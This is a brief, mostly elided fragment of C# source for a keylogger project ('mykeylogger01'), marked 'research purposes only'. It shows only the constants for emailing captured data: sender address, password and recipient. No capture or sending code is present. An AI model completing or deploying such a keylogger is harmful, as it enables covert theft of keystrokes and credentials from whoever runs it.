// research purposes only || do not run
using System;
...
namespace mykeylogger01
{
    ...
    {
        // ----------- EDIT VARIABLES ----------- //
        private const string FROM_EMAIL_ADDRESS = "fromtest.test@gmail.com";
        private const string FROM_EMAIL_PASSWORD = "dontlogintome";
        private const string TO_EMAIL_ADDRESS = "send.test@gmail.com";
